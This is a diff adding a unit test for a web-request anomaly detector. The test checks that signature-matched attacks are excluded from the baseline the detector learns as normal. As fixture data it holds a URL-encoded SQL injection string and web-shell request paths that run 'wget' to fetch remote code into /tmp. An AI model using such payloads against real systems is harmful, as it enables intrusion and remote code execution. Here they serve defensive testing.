@@ -151,3 +151,37 @@ test('a baseline that repeats a few requests does not drag the threshold to 0', 
   const manual = prepareDetector(baseline, { mode: 'combined', fpr: 'manual', threshold: 0.5 });
   assert.equal(manual.operating.threshold, 0.5);
 });
+
+test('known attacks in the baseline are left out of what counts as normal', () => {
+  const entry = (line, target) => ({
+    line,
+    method: 'GET',
+    target,
+    time: null,
+    status: 200,
+    fields: {},
+  });
+  const normal = Array.from({ length: 300 }, (_, i) => entry(i + 1, `/search?q=item${i % 37}`));
+  const sqli = entry(151, '/search?q=1%27%20OR%20%271%27%3D%271');
+  const baseline = [
+    ...normal.slice(0, 150),
+    sqli,
+    entry(152, '/shell?cd+/tmp;wget+example.com/x'),
+    ...normal.slice(150).map((e) => ({ ...e, line: e.line + 2 })),
+  ];
+  const settings = { mode: 'stats', fpr: 0.05, threshold: 1 };
+  const detector = prepareDetector(baseline, settings);
+  assert.equal(detector.known, 2);
+  assert.equal(detector.train + detector.calibration, 300, 'the model and the threshold see 300');
+  assert.match(
+    detector.warnings[0],
+    /^2 of the 302 baseline requests match a signature, such as line 151: GET \/search\?q=1%27/,
+  );
+  // Never learned as normal, the attack still stands out to the statistics alone.
+  assert.equal(inspectEntry(sqli, detector, settings, 1).alert, true);
+  // What is left must still be enough to learn from, and the error says why it is not.
+  assert.throws(
+    () => prepareDetector([...normal.slice(0, 49), entry(50, '/shell?cd+/tmp;wget+x')], settings),
+    /has 49 requests once the 1 that match a signature are left out/,
+  );
+});
